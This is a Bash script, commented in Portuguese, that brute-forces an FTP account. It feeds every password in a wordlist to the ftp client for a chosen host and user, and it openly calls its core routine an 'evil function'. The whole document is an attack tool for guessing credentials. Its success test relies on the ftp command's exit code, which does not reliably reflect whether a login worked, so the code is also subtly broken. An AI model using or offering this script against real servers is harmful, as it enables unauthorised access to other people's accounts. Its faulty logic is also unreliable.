#!/bin/bash

#Verifica se todos os  arqgumentos foram fornecidos

if [ "$#" -ne 3 ]; then
	echo "Uso: $0 <host> <usuario> <Wordlist>"
	exit 1
fi

HOST=$1
USER=$2
WORDLIST=$3


#Verifica se o arquivo de wordlist e existente

if [ ! -f "$WORDLIST" ]; then
	echo "Arquivo de wordlist não achado : $WORDLIST"
	exit 1
fi

# Função malvada para FTP 

ftp_brute_force() {
	local host=$1
	local user=$2
	local password=$3

	# Função para tentar o login
	echo " Tentando senha : $password"
	ftp -n $host <<END_SCRIPT > /dev/null 2>&1
	quote USER $user
	quote PASS $password
	quit
END_SCRIPT

	# Verifica se o login foi bem sucedido
	if [ $? -eq 0 ]; then
		echo " [+] Senha encontrada: $password "
		exit 0
	fi
}

# Le a wordlist linha por linha em busca da senha

while IFS= read -r password; do
	ftp_brute_force "$HOST" "$USER" "$password"
done < "$WORDLIST"

echo "[-] Nenhuma senha encontrada "
exit 1

